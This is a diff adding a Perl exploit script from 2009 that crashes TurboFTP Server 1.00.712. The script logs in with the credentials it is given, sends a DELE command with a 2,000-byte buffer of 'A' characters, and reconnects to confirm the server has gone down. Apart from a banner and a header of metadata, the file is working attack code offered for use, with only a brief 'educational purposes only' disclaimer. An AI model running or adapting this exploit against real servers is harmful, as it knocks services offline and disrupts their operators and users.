@@ -1,0 +1,73 @@
+# Exploit Title : TurboFTP Server 1.00.712 Remote DoS
+# Date          : 30 december 2009
+# Author        : corelanc0d3r (corelanc0d3r[at]gmail{dot}com)
+# Bug found by  : corelanc0d3r (corelanc0d3r[at]gmail{dot}com)
+# Software Link : http://www.tbsoftinc.com/download/tbftpsrv.exe
+# Version       : 1.00.712
+# Issue fixed in: 1.00.720
+# OS            : Windows
+# Tested on     : XP SP3 En (VirtualBox)
+# Type of vuln  : DoS
+# Greetz to     : Corelan Security Team::EdiStrosar/Ricks2600/MarkoT/mr_me/ekse
+#
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+#
+#
+# Code :
+print "|------------------------------------------------------------------|\n";
+print "|                         __               __                       |\n";
+print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
+print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
+print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
+print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
+print "|                                                                  |\n";
+print "|                                       http://www.corelan.be:8800 |\n";
+print "|                                                                  |\n";
+print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
+print "[+] DoS exploit for TurboFTP Server 1.00.712 \n";
+
+use IO::Socket; 
+
+if ($#ARGV ne 3) { 
+print "\n  usage: $0 <targetip> <targetport> <user> <password>\n"; 
+exit(0); 
+} 
+
+my $user=$ARGV[2];
+my $pass=$ARGV[3];
+
+print " [+] Preparing DoS payload\n";
+my $payload = "A" x 2000;
+print " [+] Connecting to server $ARGV[0] on port $ARGV[1]\n";
+$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0], 
+                              PeerPort => $ARGV[1], 
+                              Proto    => 'tcp'); 
+
+$ftp = <$sock> || die " [!] *** Unable to connect ***\n"; 
+print "   ** $ftp";
+$ftp = <$sock>;
+print "   ** $ftp";
+print " [+] Logging in (user $user)\n";
+print $sock "USER $user\r\n"; 
+$ftp = <$sock>;
+print "   ** $ftp";
+print $sock "PASS $pass\r\n"; 
+$ftp = <$sock>;
+print "   ** $ftp";
+print " [+] Sending payload\n";
+print $sock "DELE ".$payload."\r\n";
+$ftp = <$sock>;
+print "   ** $ftp";
+print " [+] Payload sent, now checking FTP server state\n";
+$sock2 = IO::Socket::INET->new(PeerAddr => $ARGV[0], 
+                              PeerPort => $ARGV[1], 
+                              Proto    => 'tcp'); 
+my $ftp2 = <$sock2> || die " [+] DoS successful\n";
+print " [!] DoS did not seem to work\n";
+print "   ** $ftp2\n";
+
+
+
+
+
